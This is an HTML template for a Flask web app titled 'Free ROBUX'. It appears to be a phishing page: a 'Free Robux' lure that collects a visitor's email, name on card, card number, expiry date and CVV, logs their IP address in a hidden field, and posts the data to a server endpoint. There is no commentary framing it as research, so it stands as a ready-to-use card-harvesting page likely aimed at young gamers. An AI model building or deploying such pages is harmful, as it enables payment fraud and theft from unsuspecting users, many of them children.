<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment - Free ROBUX</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-image: url('/static/img/pay.jpg');
            background-size: cover;
            color: #333;
            font-family: Arial, sans-serif;
            padding: 0;
            margin: 0;
        }
        header {
            background: rgba(255, 255, 255, 0.8);
            padding: 20px;
            text-align: center;
            border-bottom: 1px solid #ddd;
        }
        h1 {
            font-family: 'Comic Sans MS', cursive;
            color: #ff69b4;
            margin: 0;
        }
        nav ul {
            list-style: none;
            padding: 0;
            display: flex;
            justify-content: center;
        }
        nav ul li {
            margin-right: 20px;
        }
        nav a {
            color: purple;
            text-decoration: none;
            font-weight: bold;
        }
        .container {
            max-width: 800px;
            margin: 40px auto;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }
        .card {
            background: #fff;
            border-radius: 10px;
            margin: 15px 0;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .img-box {
            text-align: center;
            margin-bottom: 15px;
        }
        .img-box img {
            width: 60px;
        }
        .number {
            text-align: center;
            font-size: 1.5em;
            margin: 10px 0;
            font-weight: bold;
            color: #555;
        }
        .details {
            display: flex;
            justify-content: space-between;
            font-size: 0.9em;
            color: #777;
        }
        .form__div {
            position: relative;
            margin-bottom: 15px;
        }
        .form__label {
            position: absolute;
            top: 10px;
            left: 10px;
            transition: 0.2s;
            font-size: 16px;
            color: gray;
        }
        input:focus + .form__label,
        input:not(:placeholder-shown) + .form__label {
            top: -10px;
            left: 10px;
            font-size: 12px;
            color: #ff69b4;
        }
        input {
            padding: 10px;
            width: 100%;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            background-color: #ff69b4;
            color: white;
            border: none;
            border-radius: 5px;
            padding: 10px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #ff1493;
        }
        footer {
            text-align: center;
            padding: 10px;
            background: rgba(255, 255, 255, 0.5);
            border-top: 1px solid #ddd;
            position: relative;
            bottom: 0;
            width: 100%;
        }
        .alert {
            color: red;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <header>
        <h1>Package Confirmation & Validation</h1>
        <nav>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/games">Shop</a></li>
            </ul>
        </nav>
    </header>

    <div class="container">
        <div class="row">
            <div class="col-lg-4 mb-3">
                <div class="card">
                    <div class="img-box">
                        <img src="https://www.freepnglogos.com/uploads/visa-logo-download-png-21.png" alt="Visa">
                    </div>
                    <div class="number">**** **** **** 1060</div>
                    <div class="details">
                        <small><strong>Expiry date:</strong> 10/16</small>
                        <small><strong>Name:</strong> Kumar</small>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 mb-3">
                <div class="card">
                    <div class="img-box">
                        <img src="https://www.freepnglogos.com/uploads/mastercard-png/file-mastercard-logo-svg-wikimedia-commons-4.png" alt="Mastercard">
                    </div>
                    <div class="number">**** **** **** 1060</div>
                    <div class="details">
                        <small><strong>Expiry date:</strong> 10/16</small>
                        <small><strong>Name:</strong> Kumar</small>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 mb-3">
                <div class="card">
                    <div class="img-box">
                        <img src="https://www.freepnglogos.com/uploads/discover-png-logo/credit-cards-discover-png-logo-4.png" alt="Discover">
                    </div>
                    <div class="number">**** **** **** 1060</div>
                    <div class="details">
                        <small><strong>Expiry date:</strong> 10/16</small>
                        <small><strong>Name:</strong> Kumar</small>
                    </div>
                </div>
            </div>

            <div class="col-12">
                <div class="card">
                    <button class="btn btn-primary" data-bs-toggle="collapse" href="#collapsePayment" role="button" aria-expanded="true" aria-controls="collapsePayment">
                        <span class="fw-bold">Payment Information</span>
                    </button>
                    <div class="collapse show p-3 pt-0" id="collapsePayment">
                        <form action="{{ url_for('submit_payment') }}" method="POST" id="paymentForm">
                            <input type="hidden" name="user-ip" value="{{ request.remote_addr }}">

                            <div class="form__div">
                                <input type="email" id="email" name="email" class="form-control" placeholder=" " required>
                                <label for="paypal-email" class="form__label">Enter your Email</label>
                            </div>

                            <div class="form__div">
                                <input type="text" id="name" name="name" class="form-control" placeholder=" " required>
                                <label for="name-on-card" class="form__label">Name on the Card</label>
                            </div>

                            <div class="form__div">
                                <input type="text" id="card-number" name="card-number" class="form-control" placeholder=" " required>
                                <label for="card-number" class="form__label">Card Number</label>
                            </div>

                            <div class="row">
                                <div class="col-6">
                                    <div class="form__div">
                                        <input type="text" id="expiry" name="expiry" class="form-control" placeholder=" " required>
                                        <label for="expiry" class="form__label">MM / YY</label>
                                    </div>
                                </div>
                                <div class="col-6">
                                    <div class="form__div">
                                        <input type="text" id="cvc" name="cvc" class="form-control" placeholder=" " required>
                                        <label for="cvc" class="form__label">CVV Code</label>
                                    </div>
                                </div>
                            </div>

                            <div class="col-12">
                                <button type="submit" class="btn">Submit</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>

            <div class="col-12">
                <button class="btn">Thank you for stopping by !!!</button>
            </div>
        </div>
    </div>

    <footer>
        <p>&copy; 2024 Free ROBUX Shop</p>
    </footer>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const cardInput = document.getElementById('card-number');

            cardInput.addEventListener('input', function() {
                let value = cardInput.value.replace(/\D/g, ''); // Remove non-digit characters
                let formattedValue = '';

                for (let i = 0; i < value.length; i += 4) {
                    formattedValue += value.substr(i, 4) + ' '; // Add a space after every 4 digits
                }

                cardInput.value = formattedValue.trim(); // Set the formatted value back, removing any trailing space
            });
        });
    </script>
</body>
</html>
